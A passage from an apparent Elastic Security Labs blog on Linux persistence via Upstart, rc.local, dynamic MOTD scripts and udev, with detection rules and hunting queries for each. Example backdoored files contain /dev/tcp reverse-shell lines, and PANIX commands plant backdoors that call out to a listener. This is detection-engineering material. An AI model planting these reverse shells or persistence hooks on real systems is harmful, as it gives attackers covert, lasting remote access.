<p>Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This blog will solely list the available hunts for each persistence mechanism; however, more details regarding this topic are outlined at the end of the first section in <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">the previous article on persistence</a>. Additionally, descriptions and references can be found in our <a href="https://github.com/elastic/detection-rules">Detection Rules repository</a>, specifically in the <a href="https://github.com/elastic/detection-rules/tree/main/hunting">Linux hunting subdirectory</a>.</p>
<p>We can hunt for System V Init persistence through <a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html">ES|QL</a> and <a href="https://www.elastic.co/guide/en/kibana/current/osquery.html">OSQuery</a>, focusing on unusual process executions and file creations. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_sysv_init.toml">Persistence via System V Init</a> rule contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1037---boot-or-logon-initialization-scripts-upstart" class="absolute -top-32"></span>T1037 - boot or logon initialization scripts: Upstart</h3>
<p><a href="https://linux.die.net/man/7/upstart">Upstart</a> was introduced as an alternative init system designed to improve boot performance and manage system services more dynamically than traditional SysV init. While it has been largely supplanted by systemd in many Linux distributions, Upstart is still used in some older releases and legacy systems.</p>
<p>The core of Upstart&#x27;s configuration resides in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init/</code> directory, where job configuration files define how services are started, stopped, and managed. Each job file specifies dependencies, start conditions, and actions to be taken upon start, stop, and other events.</p>
<p>In Upstart, run levels are replaced with events and tasks, which define the sequence and conditions under which jobs are executed. Upstart introduces a more event-driven model, allowing services to start based on various system events rather than predefined run levels.</p>
<p>Upstart can run system-wide or in user-session mode. While system-wide configurations are placed in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init/</code> directory, user-session mode configurations are located in:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/upstart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.init/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/xdg/upstart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/upstart/sessions/</code></li>
</ul>
<p>An example of an Upstart job file can look like this:</p>
<pre><code>description &quot;Malicious Upstart Job&quot;
author &quot;Ruben Groenewoud&quot;

start on runlevel [2345]
stop on shutdown

exec nohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#x27;</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">malicious-upstart-job.conf</code> file defines a job that starts on run levels 2, 3, 4, and 5 (general Linux access and networking), and stops on run levels 0, 1, and 6 (shutdown/reboot). The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">exec</code> line executes the malicious payload to establish a reverse shell connection when the system boots up.</p>
<p>To enable the Upstart job and ensure it runs on boot, the job file must be placed in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init/</code> and given appropriate permissions. Upstart jobs are automatically recognized and managed by the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Upstart init daemon</code>.</p>
<p>Upstart was deprecated a long time ago, with Linux distributions such as Debian 7 and Ubuntu 16.04 being the final systems that leverage Upstart by default. These systems moved to the SysV init system, removing compatibility with Upstart altogether. Based on the data in our <a href="https://www.elastic.co/support/matrix">support matrix</a>, only the Elastic Agent in Beta version supports some of these old operating systems, and the recent version of Elastic Defend does not run on them at all. These systems have been EOL for years and should not be used in production environments anymore.</p>
<p>Because of this reason, we added support/coverage for this technique to the <a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a> detection rule. If you are still running these systems in production, using, for example, old versions of <a href="https://www.elastic.co/beats/auditbeat">Auditbeat</a> to gather its logs, you can set up <a href="https://www.elastic.co/guide/en/beats/auditbeat/current/configuration-auditbeat.html">Auditbeat file creation</a> and <a href="https://www.elastic.co/docs/current/integrations/fim">FIM</a> file modification rules in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init/</code> directory, similar to the techniques mentioned in the <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">previous blog</a>, and in the sections yet to come. Similarly to System V Init, information and real-world examples related to this technique are specified by MITRE in <a href="https://attack.mitre.org/techniques/T1037/">T1037</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1037004---boot-or-logon-initialization-scripts-run-control-rc-scripts" class="absolute -top-32"></span>T1037.004 - boot or logon initialization scripts: run control (RC) scripts</h2>
<p>The <a href="https://man.freebsd.org/cgi/man.cgi?rc.local">rc.local</a> script is a traditional method for executing commands or scripts on Unix-like operating systems during system boot. It is located at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> and is typically used to start services, configure networking, or perform other system initialization tasks that do not warrant a full init script. In Darwin-based systems and very few other Unix-like systems, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.common</code> is used for the same purpose.</p>
<p>Newer versions of Linux distributions have phased out the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> file in favor of Systemd for handling initialization scripts. Systemd provides compatibility through the <a href="https://man7.org/linux/man-pages/man8/systemd-rc-local-generator.8.html">systemd-rc-local-generator</a> generator; this executable ensures backward compatibility by checking if <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> exists and is executable. If it meets these criteria, it integrates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc-local.service</code> unit into the boot process. Therefore, as long as this generator is included in the Systemd setup, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> scripts will execute during system boot. In RHEL derivatives, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.d/rc.local</code> must be granted execution permissions for this technique to work.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> script is a shell script that contains commands or scripts to be executed once at the end of the system boot process, after all other system services have been started. This makes it useful for tasks that require specific system conditions to be met before execution. Here’s an example of how a simple backdoored <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> script might look:</p>
<pre><code>#!/bin/sh
/bin/bash -c &#x27;sh -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#x27;
exit 0</code></pre>
<p>The command above creates a reverse shell by opening a bash session that redirects input and output to a specified IP address and port, allowing remote access to the system.</p>
<p>To ensure <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> runs during boot, the script must be marked executable. On the next boot, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-rc-local-generator</code> will create the necessary symlink in order to enable the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc-local.service</code> and execute the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> script. RC scripts did receive their own sub-technique by MITRE. More information and examples of real-world usage of RC Scripts for persistence can be found in <a href="https://attack.mitre.org/techniques/T1037/004/">T1037.004</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1037004---run-control-rc-scripts" class="absolute -top-32"></span>Persistence through T1037.004 - run control (RC) scripts</h3>
<p>As long as the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-rc-local-generator</code> is present, establishing persistence through this technique is simple. Create the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> file, add your payload, and mark it as executable. We will leverage the following PANIX command to establish it for us.</p>
<pre><code>&gt; sudo ./panix.sh --rc-local --default --ip 192.168.1.1 --port 2007
&gt; [+] rc.local backdoor established</code></pre>
<p>After rebooting the system, we can see the following events being generated:</p>
<p></p>
<p>The same issue as before arises. We see the execution of PANIX, creating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> file and granting it execution permissions. When running <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemctl daemon-reload</code>, we can see the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-rc-local-generator</code> creating a symlink in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/systemd/generator[.early|late]</code> directories.</p>
<p>Similar to the previous example in which we ran into this issue, we can again use the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">already_running</code> <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">event.action</code> documents to get some information on the executions. Digging into this, one method that detects potential traces of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> execution is to search for documents containing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local start</code> entries:</p>
<p></p>
<p>Where we see <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> being started, after which a suspicious command is executed. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/opt/bds_elf</code> is a rootkit, leveraging <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> as a persistence method.</p>
<p>Additionally, we can leverage the <a href="https://man7.org/linux/man-pages/man3/syslog.3.html">syslog</a> data source, as this file is parsed on initialization of the system integration. You can set up <a href="https://www.elastic.co/beats/filebeat">Filebeat</a> or the <a href="https://www.elastic.co/elastic-agent">Elastic Agent</a> with the <a href="https://www.elastic.co/docs/current/en/integrations/system">System integration</a> to harvest syslog. When looking at potential errors in its execution logs, we can detect other traces of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc.local</code> execution events for both our testing and rootkit executions:</p>
<p></p>
<p>Because of the challenges in detecting these persistence mechanisms, it is very important to catch traces as early in the chain as possible. Leveraging a multi-layered defense strategy increases the chances of detecting techniques like these.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_script_creation.toml">rc.local/rc.common File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_service_already_running.toml">Potential Execution of rc.local Script</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml">Executable Bit Set for Potential Persistence Script</a></td></tr><tr><td>Syslog</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_rc_local_error_via_syslog.toml">Suspicious rc.local Error Message</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1037004---run-control-rc-scripts" class="absolute -top-32"></span>Hunting for T1037.004 - run control (RC) scripts</h3>
<p>Similar to the System V Init detection opportunity limitations, this technique deals with the same limitations due to timing. Thus, hunting for RC Script persistence is important. We can hunt for this technique by looking at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc.local</code> file creations and/or modifications and the existence of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">rc-local.service</code> systemd unit/startup item. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_rc_local.toml">Persistence via rc.local/rc.common</a> rule contains several ES|QL and OSQuery queries that aid in hunting for this technique.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1037---boot-or-logon-initialization-scripts-message-of-the-day-motd" class="absolute -top-32"></span>T1037 - boot or logon initialization scripts: Message of the Day (MOTD)</h2>
<p><a href="https://linux.die.net/man/5/motd">Message of the Day (MOTD)</a> is a feature that displays a message to users when they log in via SSH or a local terminal. To display messages before and after the login process, Linux uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/issue</code> and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/motd</code> files. These messages display on the command line and will not be seen before and after a graphical login. The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/issue</code> file is typically used to display a login message or banner, while the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/motd</code> file generally displays issues, security policies, or messages. These messages are global and will display to all users at the command line prompt. Only a privileged user (such as root) can edit these files.</p>
<p>In addition to the static <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/motd</code> file, modern systems often use dynamic MOTD scripts stored in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/update-motd.d/</code>. These scripts generate dynamic content that can be included in the MOTD, such as current system metrics, weather updates, or news headlines.</p>
<p>These dynamic scripts are shell scripts that execute shell commands. It is possible to create a new file within this directory or to add a backdoor to an existing one. Once the script has been granted execution permissions, it will execute every time a user logs in.</p>
<p>RHEL derivatives do not make use of dynamic MOTD scripts in a similar way as Debian does, and are not susceptible to this technique.</p>
<p>An example of a backdoored <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/update-motd.d/</code> file could look like this:</p>
<pre><code>#!/bin/sh
nohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#x27;</code></pre>
<p>Like before, MITRE does not have a specific technique related to this. Therefore we classify this technique as <a href="https://attack.mitre.org/techniques/T1037/">T1037</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1037---message-of-the-day-motd" class="absolute -top-32"></span>Persistence through T1037 - message of the day (MOTD)</h3>
<p>A <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1644-L1669">payload</a> similar to the one presented above should be used to ensure the backdoor does not interrupt the SSH login, potentially triggering the user’s attention. We can leverage PANIX to set up persistence on Debian-based systems through MOTD like so:</p>
<pre><code> &gt; sudo ./panix.sh --motd --default --ip 192.168.1.1 --port 2008
&gt; [+] MOTD backdoor established in /etc/update-motd.d/137-python-upgrades</code></pre>
<p>To trigger the backdoor, we can reconnect to the server via SSH or reconnect to the terminal.</p>
<p></p>
<p>In the image above we can see PANIX being executed, which creates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/update-motd.d/137-python-upgrades</code> file and marks it as executable. Next, when a user connects to SSH/console, the payload is executed, resulting in an egress network connection by the root user. This is a straightforward attack chain, and we have several layers of detections for this:</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_message_of_the_day_creation.tom">Message-of-the-Day (MOTD) File Creation</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_process_spawned_from_motd_detected.toml">Process Spawned from Message-of-the-Day (MOTD)</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_suspicious_message_of_the_day_execution.toml">Suspicious Message Of The Day Execution</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml">Executable Bit Set for Potential Persistence Script</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_motd_execution_followed_by_egress_network_connection.toml">MOTD Execution Followed by Egress Network Connection</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_egress_network_connection_by_motd_child.toml">Egress Network Connection by MOTD Child</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1037---message-of-the-day-motd" class="absolute -top-32"></span>Hunting for T1037 - message of the day (MOTD)</h3>
<p>Hunting for MOTD persistence can be conducted through ES|QL and OSQuery. We can do so by analyzing file creations in these directories and executions from MOTD parent processes. We created the <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_message_of_the_day.toml">Persistence via Message-of-the-Day</a> rule aid in this endeavor.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1546---event-triggered-execution-udev" class="absolute -top-32"></span>T1546 - event triggered execution: udev</h2>
<p><a href="https://man7.org/linux/man-pages/man7/udev.7.html">Udev</a> is the device manager for the Linux kernel, responsible for managing device nodes in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/dev</code> directory. It dynamically creates or removes device nodes, manages permissions, and handles various events triggered by device state changes. Essentially, Udev acts as an intermediary between the kernel and user space, ensuring that the operating system appropriately handles hardware changes.</p>
<p>When a new device is added to the system (such as a USB drive, keyboard, or network interface), Udev detects this event and applies predefined rules to manage the device. Each rule consists of key-value pairs that match device attributes and actions to be performed. Udev rules files are processed in lexical order, and rules can match various device attributes, including device type, kernel name, and more. Udev rules are defined in text files within a default set of directories:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/udev/rules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/udev/rules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/lib/udev/rules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/local/lib/udev/rules.d/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/lib/udev/</code></li>
</ul>
<p>Priority is measured based on the source directory of the rule file and takes precedence based on the order listed above (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/run/</code> → <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/</code>). When a rule matches, it can trigger a wide range of actions, including executing arbitrary commands or scripts. This flexibility makes Udev a potential vector for persistence by malicious actors. An example Udev rule looks like the following:</p>
<pre><code>SUBSYSTEM==&quot;block&quot;, ACTION==&quot;add|change&quot;, ENV{DM_NAME}==&quot;ubuntu--vg-ubuntu--lv&quot;, SYMLINK+=&quot;disk/by-dname/ubuntu--vg-ubuntu--lv&quot;</code></pre>
<p>To leverage this method for persistence, root privileges are required. Once a rule file is created, the rules need to be reloaded.</p>
<pre><code>sudo udevadm control --reload-rules</code></pre>
<p>To test the rule, either perform the action specified in the rule file or use the <a href="https://www.man7.org/linux/man-pages/man8/udevadm.8.html">udevadm</a> trigger utility.</p>
<pre><code>sudo udevadm trigger -v</code></pre>
<p>Additionally, these drivers can be monitored using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">udevadm</code>, by running:</p>
<pre><code>udevadm monitor --environment</code></pre>
<p>Eder’s <a href="https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/">blog</a> titled “Leveraging Linux udev for persistence” is a very good read for more information on this topic. This technique has several limitations, making it more difficult to leverage the persistence mechanism.</p>
<ul>
<li>Udev rules are limited to short foreground tasks due to potential blocking of subsequent events.</li>
<li>They cannot execute programs accessing networks or filesystems, enforced by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-udevd.service</code>&#x27;s sandbox.</li>
<li>Long-running processes are terminated after event handling.</li>
</ul>
<p>Despite these restrictions, bypasses include creating detached processes outside udev rules for executing implants, such as:</p>
<ul>
<li>Leveraging <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">at</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code> for independent scheduling.</li>
<li>Injecting code into existing processes.</li>
</ul>
<p>Although persistence would be set up through a different technique than udev, udev would still grant a persistence mechanism for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">at</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code> persistence mechanism. MITRE does not have a technique dedicated to this mechanism — the most logical technique to add this to would be <a href="https://attack.mitre.org/techniques/T1546/">T1546</a>.</p>
<p>Researchers from AON recently discovered a malware called &quot;sedexp&quot; that achieves persistence using Udev rules - a technique rarely seen in the wild - so be sure to check out <a href="https://www.aon.com/en/insights/cyber-labs/unveiling-sedexp">their research article</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="persistence-through-t1546---udev" class="absolute -top-32"></span>Persistence through T1546 - udev</h2>
<p>PANIX allows you to test all three techniques by leveraging <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--at</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--cron</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">--systemd</code>, respectively. Or go ahead and test it manually. We can set up udev persistence through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">at</code>, by running the following command:</p>
<pre><code>&gt; sudo ./panix.sh --udev --default --ip 192.168.1.1 --port 2009 --at</code></pre>
<p>To trigger the payload, you can either run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo udevadm trigger</code> or reboot the system. Let’s analyze the events in Discover.</p>
<p></p>
<p>In the figure above, PANIX is executed, which creates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/atest</code> backdoor and grants it execution permissions. Subsequently, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">10-atest.rules</code> file is generated, and the drivers are reloaded and triggered. This causes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">At</code> to be spawned as a child process of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">udevadm</code>, creating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">atspool</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">atjob</code>, and subsequently executing the reverse shell.</p>
<p>Cron follows a similar structure; however, it is slightly more difficult to catch the malicious activity, as the child process of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">udevadm</code> is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>, which is not unusual.</p>
<p></p>
<p>Finally, when looking at the documents generated by Udev in combination with Systemd, we see the following:</p>
<p></p>
<p>Which also does not show a relationship with udev, other than the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">12-systemdtest.rules</code> file that is created.</p>
<p>This leads these last two mechanisms to be detected through our previous systemd/cron related rules, rather than specific udev rules. Let’s take a look at the coverage (We omitted the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cron</code> rules, as these were already mentioned in <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">the previous persistence blog</a>):</p>
